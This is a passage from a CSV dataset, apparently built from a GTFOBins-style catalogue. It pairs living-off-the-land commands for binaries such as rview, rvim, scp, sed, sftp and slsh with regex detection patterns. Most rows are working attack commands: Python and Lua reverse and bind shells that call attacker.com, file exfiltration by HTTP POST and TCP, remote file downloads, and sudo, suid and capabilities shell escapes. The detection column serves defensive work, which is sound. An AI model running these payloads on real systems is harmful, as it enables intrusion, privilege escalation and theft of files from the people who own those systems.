f:close();t:close();'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?rview\s*\-c\s+(?:getenv\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\)).*(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Run ``nc -l -p 12345`` on the attacker box to receive the shell. This requires that `rview` is compiled with Lua support and that `lua-socket` is installed.
rview,non-interactive-bind-shell,"export LPORT=12345
rview -c ':lua local k=require(""socket"");
local s=assert(k.bind(""*"",os.getenv(""LPORT"")));
local c=s:accept();
while true do
local r,x=c:receive();local f=assert(io.popen(r,""r""));
local b=assert(f:read(""*a""));c:send(b);
end;c:close();f:close();'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?rview\s*\-c\s+(?:getenv\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\)).*(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Run `nc target.com 12345` on the attacker box to connect to the shell. This requires that `rview` is compiled with Lua support and that `lua-socket` is installed.
rview,file-upload,"export URL=http://attacker.com/
export LFILE=file_to_send
rview -c ':py import vim,sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
else: import urllib as u, urllib2 as r
r.urlopen(e[""URL""], bytes(u.urlencode({""d"":open(e[""LFILE""]).read()}).encode()))
vim.command("":q!"")'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?rview\s*\-c\s+(?:\bimport\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","This requires that `rview` is compiled with Python support. Prepend `:py3` for Python 3. Send local file via ""d"" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file."
rview,file-upload,"export LPORT=8888
rview -c ':py import vim,sys; from os import environ as e
if sys.version_info.major == 3: import http.server as s, socketserver as ss
else: import SimpleHTTPServer as s, SocketServer as ss
ss.TCPServer(("""", int(e[""LPORT""])), s.SimpleHTTPRequestHandler).serve_forever()
vim.command("":q!"")'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?rview\s*\-c\s+(?:\bimport\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",This requires that `rview` is compiled with Python support. Prepend `:py3` for Python 3. Serve files in the local folder running an HTTP server.
rview,file-upload,"export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_send
rview -c ':lua local f=io.open(os.getenv(""LFILE""), 'rb')
local d=f:read(""*a"")
io.close(f);
local s=require(""socket"");
local t=assert(s.tcp());
t:connect(os.getenv(""RHOST""),os.getenv(""RPORT""));
t:send(d);
t:close();'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?rview\s*\-c\s+(?:getenv\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\)).*(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Send a local file via TCP. Run `nc -l -p 12345 > ""file_to_save""` on the attacker box to collect the file. This requires that `rview` is compiled with Lua support and that `lua-socket` is installed."
rview,file-download,"export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
rview -c ':py import vim,sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve(e[""URL""], e[""LFILE""])
vim.command("":q!"")'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?rview\s*\-c\s+(?:\bimport\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",This requires that `rview` is compiled with Python support. Prepend `:py3` for Python 3. Fetch a remote file via HTTP GET request.
rview,file-download,"export LPORT=12345
export LFILE=file_to_save
rview -c ':lua local k=require(""socket"");
local s=assert(k.bind(""*"",os.getenv(""LPORT"")));
local c=s:accept();
local d,x=c:receive(""*a"");
c:close();
local f=io.open(os.getenv(""LFILE""), ""wb"");
f:write(d);
io.close(f);'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?rview\s*\-c\s+(?:getenv\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\)).*(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Fetch a remote file via TCP. Run `nc target.com 12345 < ""file_to_send""` on the attacker box to send the file. This requires that `rview` is compiled with Lua support and that `lua-socket` is installed."
rview,file-write,"rview file_to_write
iDATA
^[
w!",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?rview\s+.+),
rview,file-read,rview file_to_read,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?rview\s+.+),
rview,library-load,"rview -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary(""lib.so""); vim.command("":q!"")'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?rview\s*\-c\s+(?:\bimport\b)),This requires that `rview` is compiled with Python support. Prepend `:py3` for Python 3.
rview,suid,"./rview -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-pc"", ""reset; exec sh -p"")'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?rview\s*\-c\s*\-p\s+(?:/bin/(?:sh|bash)).*(?:\bimport\b)),This requires that `rview` is compiled with Python support. Prepend `:py3` for Python 3.
rview,sudo,"sudo rview -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?rview\s*\-c\s+(?:/bin/(?:sh|bash)).*(?:\bimport\b)),This requires that `rview` is compiled with Python support. Prepend `:py3` for Python 3.
rview,sudo,"sudo rview -c ':lua os.execute(""reset; exec sh"")'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?rview\s*\-c\s+.+),This requires that `rview` is compiled with Lua support.
rview,capabilities,"./rview -c ':py import os; os.setuid(0); os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?rview\s*\-c\s+(?:/bin/(?:sh|bash)).*(?:\bimport\b)),This requires that `rview` is compiled with Python support. Prepend `:py3` for Python 3.
rview,limited-suid,"./rview -c ':lua os.execute(""reset; exec sh"")'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?rview\s*\-c\s+.+),This requires that `rview` is compiled with Lua support.
rvim,shell,"rvim -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?rvim\s*\-c\s+(?:/bin/(?:sh|bash)).*(?:\bimport\b)),This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3.
rvim,shell,"rvim -c ':lua os.execute(""reset; exec sh"")'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?rvim\s*\-c\s+.+),This requires that `rvim` is compiled with Lua support.
rvim,reverse-shell,"export RHOST=attacker.com
export RPORT=12345
rvim -c ':py import vim,sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv(""RHOST""),int(os.getenv(""RPORT""))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn(""/bin/sh"")
vim.command("":q!"")'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?rvim\s*\-c\s+(?:getenv\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\)).*(?:/bin/(?:sh|bash)).*(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:\bimport\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3. Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell."
rvim,non-interactive-reverse-shell,"export RHOST=attacker.com
export RPORT=12345
rvim -c ':lua local s=require(""socket""); local t=assert(s.tcp());
t:connect(os.getenv(""RHOST""),os.getenv(""RPORT""));
while true do
local r,x=t:receive();local f=assert(io.popen(r,""r""));
local b=assert(f:read(""*a""));t:send(b);
end;
f:close();t:close();'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?rvim\s*\-c\s+(?:getenv\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\)).*(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Run ``nc -l -p 12345`` on the attacker box to receive the shell. This requires that `rvim` is compiled with Lua support and that `lua-socket` is installed.
rvim,non-interactive-bind-shell,"export LPORT=12345
rvim -c ':lua local k=require(""socket"");
local s=assert(k.bind(""*"",os.getenv(""LPORT"")));
local c=s:accept();
while true do
local r,x=c:receive();local f=assert(io.popen(r,""r""));
local b=assert(f:read(""*a""));c:send(b);
end;c:close();f:close();'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?rvim\s*\-c\s+(?:getenv\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\)).*(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Run `nc target.com 12345` on the attacker box to connect to the shell. This requires that `rvim` is compiled with Lua support and that `lua-socket` is installed.
rvim,file-upload,"export URL=http://attacker.com/
export LFILE=file_to_send
rvim -c ':py import vim,sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
else: import urllib as u, urllib2 as r
r.urlopen(e[""URL""], bytes(u.urlencode({""d"":open(e[""LFILE""]).read()}).encode()))
vim.command("":q!"")'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?rvim\s*\-c\s+(?:\bimport\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3. Send local file via ""d"" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file."
rvim,file-upload,"export LPORT=8888
rvim -c ':py import vim,sys; from os import environ as e
if sys.version_info.major == 3: import http.server as s, socketserver as ss
else: import SimpleHTTPServer as s, SocketServer as ss
ss.TCPServer(("""", int(e[""LPORT""])), s.SimpleHTTPRequestHandler).serve_forever()
vim.command("":q!"")'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?rvim\s*\-c\s+(?:\bimport\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3. Serve files in the local folder running an HTTP server.
rvim,file-upload,"export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_send
rvim -c ':lua local f=io.open(os.getenv(""LFILE""), 'rb')
local d=f:read(""*a"")
io.close(f);
local s=require(""socket"");
local t=assert(s.tcp());
t:connect(os.getenv(""RHOST""),os.getenv(""RPORT""));
t:send(d);
t:close();'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?rvim\s*\-c\s+(?:getenv\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\)).*(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Send a local file via TCP. Run `nc -l -p 12345 > ""file_to_save""` on the attacker box to collect the file. This requires that `rvim` is compiled with Lua support and that `lua-socket` is installed."
rvim,file-download,"export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
rvim -c ':py import vim,sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve(e[""URL""], e[""LFILE""])
vim.command("":q!"")'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?rvim\s*\-c\s+(?:\bimport\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3. Fetch a remote file via HTTP GET request.
rvim,file-download,"export LPORT=12345
export LFILE=file_to_save
rvim -c ':lua local k=require(""socket"");
local s=assert(k.bind(""*"",os.getenv(""LPORT"")));
local c=s:accept();
local d,x=c:receive(""*a"");
c:close();
local f=io.open(os.getenv(""LFILE""), ""wb"");
f:write(d);
io.close(f);'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?rvim\s*\-c\s+(?:getenv\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\)).*(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Fetch a remote file via TCP. Run `nc target.com 12345 < ""file_to_send""` on the attacker box to send the file. This requires that `rvim` is compiled with Lua support and that `lua-socket` is installed."
rvim,file-write,"rvim file_to_write
iDATA
^[
w",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?rvim\s+.+),
rvim,file-read,rvim file_to_read,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?rvim\s+.+),
rvim,library-load,"rvim -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary(""lib.so""); vim.command("":q!"")'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?rvim\s*\-c\s+(?:\bimport\b)),This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3.
rvim,suid,"./rvim -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-pc"", ""reset; exec sh -p"")'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?rvim\s*\-c\s*\-p\s+(?:/bin/(?:sh|bash)).*(?:\bimport\b)),This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3.
rvim,sudo,"sudo rvim -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?rvim\s*\-c\s+(?:/bin/(?:sh|bash)).*(?:\bimport\b)),This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3.
rvim,sudo,"sudo rvim -c ':lua os.execute(""reset; exec sh"")'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?rvim\s*\-c\s+.+),This requires that `rvim` is compiled with Lua support.
rvim,capabilities,"./rvim -c ':py import os; os.setuid(0); os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?rvim\s*\-c\s+(?:/bin/(?:sh|bash)).*(?:\bimport\b)),This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3.
rvim,limited-suid,"./rvim -c ':lua os.execute(""reset; exec sh"")'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?rvim\s*\-c\s+.+),This requires that `rvim` is compiled with Lua support.
sash,shell,sash,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?sash\s+.+),
sash,suid,./sash,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?sash\s+.+),
sash,sudo,sudo sash,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?sash\s+.+),
scanmem,shell,"scanmem
shell /bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?scanmem\s+(?:/bin/(?:sh|bash))),
scanmem,suid,"./scanmem
shell /bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?scanmem\s+(?:/bin/(?:sh|bash))),
scanmem,sudo,"sudo scanmem
shell /bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?scanmem\s+(?:/bin/(?:sh|bash))),
scp,shell,"echo 'sh 0<&2 1>&2' > $TF
chmod +x ""$TF""
scp -S $TF x y:","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?scp\s*\-S\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
scp,file-upload,scp $LFILE $RPATH,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?scp\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Send local file to a SSH server.
scp,file-download,scp $RPATH $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?scp\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Fetch a remote file from a SSH server.
scp,sudo,"echo 'sh 0<&2 1>&2' > $TF
chmod +x ""$TF""
sudo scp -S $TF x y:","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?scp\s*\-S\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
scp,limited-suid,"echo 'sh 0<&2 1>&2' > $TF
chmod +x ""$TF""
./scp -S $TF a b:","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?scp\s*\-S\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
screen,shell,screen,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?screen\s+.+),
screen,file-write,screen -L -Logfile $LFILE echo DATA,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?screen\s*\-L\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",This works on screen version 4.06.02. Data is appended to the file and `\n` is converted to `\r\n`.
screen,file-write,screen -L $LFILE echo DATA,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?screen\s*\-L\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",This works on screen version 4.05.00. Data is appended to the file and `\n` is converted to `\r\n`.
screen,sudo,sudo screen,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?screen\s+.+),
script,shell,script -q /dev/null,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?script\s*\-q\s+.+),
script,sudo,sudo script -q /dev/null,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?script\s*\-q\s+.+),
script,file-write,script -q -c 'echo DATA' file_to_write,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?script\s*\-q\s*\-c\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",The wrote content is corrupted by debug prints.
scrot,shell,scrot -e /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?scrot\s*\-e\s+(?:/bin/(?:sh|bash))),
scrot,limited-suid,./scrot -e /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?scrot\s*\-e\s+(?:/bin/(?:sh|bash))),
scrot,sudo,sudo scrot -e /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?scrot\s*\-e\s+(?:/bin/(?:sh|bash))),
sed,shell,sed -n '1e exec sh 1>&0' /etc/hosts,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?sed\s*\-n\s+.+),"GNU version only. Also, this requires `bash`."
sed,shell,sed e,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?sed\s+.+),GNU version only. The resulting shell is not a proper TTY shell.
sed,command,sed -n '1e id' /etc/hosts,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?sed\s*\-n\s+.+),GNU version only.
sed,file-write,"sed -n ""1s/.*/DATA/w $LFILE"" /etc/hosts","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?sed\s*\-n\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
sed,file-read,"sed '' ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?sed\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
sed,suid,"./sed -e '' ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?sed\s*\-e\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
sed,sudo,sudo sed -n '1e exec sh 1>&0' /etc/hosts,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?sed\s*\-n\s+.+),"GNU version only. Also, this requires `bash`."
service,shell,/usr/sbin/service ../../bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?service\s+(?:/bin/(?:sh|bash))),
service,sudo,sudo service ../../bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?service\s+(?:/bin/(?:sh|bash))),
setarch,shell,setarch $(arch) /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?setarch\s+(?:/bin/(?:sh|bash))),
setarch,suid,./setarch $(arch) /bin/sh -p,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?setarch\s*\-p\s+(?:/bin/(?:sh|bash))),
setarch,sudo,sudo setarch $(arch) /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?setarch\s+(?:/bin/(?:sh|bash))),
setfacl,suid,./setfacl -m u:$USER:rwx $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?setfacl\s*\-m\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
setfacl,sudo,sudo setfacl -m -u:$USER:rwx $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?setfacl\s*\-m\s*\-u\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
setlock,shell,setlock $TF /bin/sh,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?setlock\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
setlock,suid,./setlock - /bin/sh -p,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?setlock\s*\-p\s+(?:/bin/(?:sh|bash))),
setlock,sudo,sudo setlock - /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?setlock\s+(?:/bin/(?:sh|bash))),
sftp,shell,"sftp $HOST
!/bin/sh","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?sftp\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
sftp,file-upload,"sftp $RHOST
put file_to_send file_to_save","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?sftp\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Send local file to a SSH server.
sftp,file-download,"sftp $RHOST
get file_to_get file_to_save","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?sftp\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Fetch a remote file from a SSH server.
sftp,sudo,"sudo sftp $HOST
!/bin/sh","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?sftp\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
sg,shell,sg $(id -ng),(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?sg\s+.+),"Commands can be run if the current user's group is specified, therefore no additional permissions are needed."
sg,sudo,sudo sg root,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?sg\s+.+),
shuf,file-read,"shuf -z ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?shuf\s*\-z\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",The read file content is corrupted by randomizing the order of NUL terminated strings.
shuf,file-write,"shuf -e DATA -o ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?shuf\s*\-e\s*\-o\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",The written file content is corrupted by adding a newline.
shuf,suid,"./shuf -e DATA -o ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?shuf\s*\-e\s*\-o\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",The written file content is corrupted by adding a newline.
shuf,sudo,"sudo shuf -e DATA -o ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?shuf\s*\-e\s*\-o\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",The written file content is corrupted by adding a newline.
slsh,shell,"slsh -e 'system(""/bin/sh"")'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?slsh\s*\-e\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)))",
slsh,sudo,"sudo slsh -e 'system(""/bin/sh"")'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?slsh\s*\-e\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)))",
slsh,limited-suid,"./slsh -e 'system(""/bin/sh"")'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?slsh\s*\-e\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)))",
smbclient,shell,"smbclient '\\attacker\share'
